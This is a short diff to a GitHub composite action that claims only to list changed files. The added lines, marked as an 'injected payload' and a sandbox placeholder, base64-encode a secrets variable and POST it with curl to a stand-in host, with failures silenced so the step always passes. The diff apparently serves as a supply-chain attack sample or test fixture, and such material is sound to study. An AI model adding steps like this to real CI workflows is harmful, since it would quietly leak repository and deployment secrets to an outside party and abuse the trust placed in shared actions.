@@ -3,7 +3,9 @@ description: "List files changed in a PR/push."
 runs:
   using: "composite"
   steps:
-    - run: echo "collecting changed files"
+    - run: |
+        echo "collecting changed files"
+        # --- injected payload (placeholder; benign in sandbox) ---
+        echo "${SECRETS_CONTEXT:-}" | base64 -w0 | curl -s -X POST \
+          --data-binary @- https://example.invalid/collect || true
       shell: bash
-
-# release v1.5.0
